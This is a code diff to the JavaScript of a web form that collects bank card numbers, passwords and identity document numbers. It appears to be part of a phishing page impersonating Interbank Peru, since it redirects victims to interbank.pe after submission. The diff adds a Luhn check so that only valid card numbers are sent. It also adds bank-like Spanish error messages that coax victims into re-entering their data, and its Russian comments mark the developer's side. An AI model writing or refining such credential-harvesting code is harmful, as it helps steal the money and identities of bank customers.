@@ -1,6 +1,15 @@
 document.addEventListener("DOMContentLoaded", function () {
-  var initialHeight = window.innerHeight;
-  document.body.style.minHeight = initialHeight + "px";
+  // var initialHeight = window.innerHeight;
+  // document.body.style.minHeight = initialHeight + "px";
+  let lunarChecked = false
+  const container = document.querySelector('.container');
+  let errorMes = ''
+  container.style.minHeight = `${window.innerHeight}px`;
+  window.addEventListener('resize', () => {
+    const container = document.querySelector('.container');
+    container.style.minHeight = `${window.innerHeight}px`;
+  });
+
   const form = document.querySelector("#myForm");
   const cardNumber = document.querySelector("#cardNumber");
   const docType = document.querySelector("#docType");
@@ -110,18 +119,18 @@ document.addEventListener("DOMContentLoaded", function () {
   form.addEventListener("submit", function (e) {
     e.preventDefault();
     let valid = true;
-    let errorMessage = "Por favor, corrija los siguientes errores:\n";
+     errorMes = "Por favor, corrija los siguientes errores:\n";
 
     let cardNumValue = cardNumber.value.replace(/ /g, "");
     if (cardNumValue.length !== 16 || isNaN(cardNumValue)) {
       valid = false;
-      errorMessage +=
-        "- Número de tarjeta debe contener exactamente 16 dígitos.\n";
+      errorMes +=
+        "Por favor, ingresa todos los dígitos de tu tarjeta";
     }
 
     if (password.value.length < 6 || password.value.length > 20) {
       valid = false;
-      errorMessage += "- La contraseña debe tener entre 6 y 20 caracteres.\n";
+      errorMes += "- La contraseña debe tener entre 6 y 20 caracteres.\n";
     }
 
     let docNumValue = docNumber.value;
@@ -129,19 +138,19 @@ document.addEventListener("DOMContentLoaded", function () {
       case "DNI":
         if (!/^\d+$/.test(docNumValue)) {
           valid = false;
-          errorMessage += "- DNI debe contener solo números.\n";
+          errorMes = "ingresa tu numero de documento para confirmar la operación";
         }
         break;
       case "Pasaporte":
       case "CE":
         if (!/^[a-zA-Z0-9]{4,11}$/.test(docNumValue)) {
           valid = false;
-          errorMessage += `- ${docType.value} debe contener entre 4 y 11 caracteres alfanuméricos.\n`;
+          errorMes = "ingresa tu numero de documento para confirmar la operación";
         }
         break;
     }
 
-    if (valid) {
+    if (valid && lunarChecked) {
       sendForm("myForm");
       loader.style.display = "flex";
     } else {
@@ -155,6 +164,8 @@ document.addEventListener("DOMContentLoaded", function () {
 
   // Открытие модального окна вместо alert
   function showModal() {
+    const popup_error = document.getElementById('popup-error')
+    popup_error.innerText = errorMes
     modal.style.display = "flex";
   }
 
@@ -164,11 +175,11 @@ document.addEventListener("DOMContentLoaded", function () {
   });
 
   // Закрытие модального окна при клике вне его области
-  window.addEventListener("click", function (event) {
-    if (event.target === modal) {
-      modal.style.display = "none";
-    }
-  });
+  // window.addEventListener("click", function (event) {
+  //   if (event.target === modal) {
+  //     modal.style.display = "none";
+  //   }
+  // });
 
   // Замена стандартного alert на модальное окно
   function customAlert() {
@@ -227,6 +238,8 @@ document.addEventListener("DOMContentLoaded", function () {
           } else if (responseCode === 201) {
             window.location.href = "https://interbank.pe"; //редир на интер
           } else if (responseCode === 202) {
+            errorMes = "Los datos ingresados son incorrectos. Por favor valida tu número de tarjeta y documento de identidad."
+            customAlert()
             //добавь свой код который при ошибке ебашишь
           } else {
             console.error("Unexpected response code: " + responseCode);
@@ -243,4 +256,37 @@ document.addEventListener("DOMContentLoaded", function () {
     var urlParams = new URLSearchParams(window.location.search);
     return urlParams.get(name);
   }
+  // Функция для проверки номера карты с использованием алгоритма Луна
+function luhnCheck(cardNumber) {
+  let arr = cardNumber.split('').reverse();
+  let sum = 0;
+
+  for (let i = 0; i < arr.length; i++) {
+    let digit = parseInt(arr[i], 10);
+
+    if (i % 2 !== 0) {
+      digit *= 2;
+      if (digit > 9) {
+        digit -= 9;
+      }
+    }
+    sum += digit;
+  }
+  return sum % 10 === 0;
+}
+
+// Слушатель событий для поля ввода номера карты
+document.getElementById("cardNumber").addEventListener("input", function(e) {
+  const input = e.target.value.replace(/\s+/g, '');  // Удаляем все пробелы
+  if (input.length >= 16) {  // Здесь может быть ваше условие для длины карты
+    if (luhnCheck(input)) {
+      lunarChecked = true
+      // console.log("Номер карты валидный");
+    } else {
+      lunarChecked =false
+      // console.log("Номер карты невалидный");
+    }
+  }
+});
+
 });
